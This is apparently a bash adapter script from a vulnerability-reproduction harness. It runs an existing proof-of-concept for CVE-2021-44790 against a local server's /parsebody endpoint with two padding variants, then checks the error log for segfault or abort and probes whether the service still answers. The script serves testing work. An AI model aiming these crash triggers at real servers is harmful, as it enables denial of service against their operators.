#!/usr/bin/env bash
# CVE-2021-44790 适配器：统一普通构建，pad=3/pad=0 同请求打三个变体
# 退出码：0=正常观测，3=环境问题（poc.py 缺失等）
# 环境变量：QW9_BASE_URL QW9_PORT QW9_PREFIX QW9_OUT_DIR QW9_POC_ROOT
set -u
BASE="${QW9_BASE_URL:?}" PORT="${QW9_PORT:?}" PREFIX="${QW9_PREFIX:?}"
OUT="${QW9_OUT_DIR:?}" POC="${QW9_POC_ROOT:?}/poc/CVE-2021-44790/poc.py"
mkdir -p "$OUT"
[ -f "$POC" ] || { echo "缺少 poc.py: $POC"; exit 3; }

# 触发（沿用已验证的 PoC；pad=3 → vlen+1 回绕，pad=0 → 巨量分配 abort）
python3 "$POC" 127.0.0.1 "$PORT" /parsebody 3 > "$OUT/pad3.txt" 2>&1 || true
sleep 2
python3 "$POC" 127.0.0.1 "$PORT" /parsebody 0 > "$OUT/pad0.txt" 2>&1 || true
sleep 2

# 观测：崩溃信号（error_log）+ 服务存活（新请求仍 200 = master 可再派生子进程）
cp -f "$PREFIX/logs/error_log" "$OUT/error_log.txt" 2>/dev/null || true
grep -aq 'exit signal Segmentation fault' "$OUT/error_log.txt" 2>/dev/null && segv_signal=1 || segv_signal=0
grep -aq 'Memory allocation failed, aborting process\|exit signal Abort' "$OUT/error_log.txt" 2>/dev/null && alloc_abort=1 || alloc_abort=0
code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$BASE/" 2>/dev/null) || code=000
[ "$code" = "200" ] && service_alive=1 || service_alive=0

echo "segv_signal=$segv_signal"
echo "alloc_abort=$alloc_abort"
echo "service_alive=$service_alive"
echo "probe_http_code=$code"
exit 0
